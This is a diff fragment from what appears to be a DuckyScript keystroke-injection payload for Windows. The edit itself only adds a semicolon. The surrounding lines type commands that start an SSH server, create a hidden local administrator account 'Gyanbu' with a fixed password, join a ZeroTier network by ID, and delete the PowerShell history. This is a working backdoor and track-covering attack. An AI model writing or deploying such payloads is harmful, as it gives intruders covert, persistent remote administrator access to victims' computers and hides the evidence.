@@ -26,7 +26,7 @@ STRING Start-Service sshd;
 STRING New-Item 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' -Force | New-ItemProperty -Name Gyanbu -Value 0 -PropertyType DWord -Force;
 STRING net user Gyanbu Senpai /add;
 STRING net localgroup Administrators Gyanbu /add;
-STRING net localgroup Administratorzy Gyanbu /add
+STRING net localgroup Administratorzy Gyanbu /add;
 STRING Start-Process ${86}\ZeroTier\One\zerotier-cli.bat 'join d3ecf5726d17a420';
 STRING Get-NetConnectionProfile -InterfaceAlias 'ZeroTier One *' | Set-NetConnectionProfile -NetworkCategory Private;
 STRING ";(Get-PSReadlineOption).HistorySavePath | rm;exit
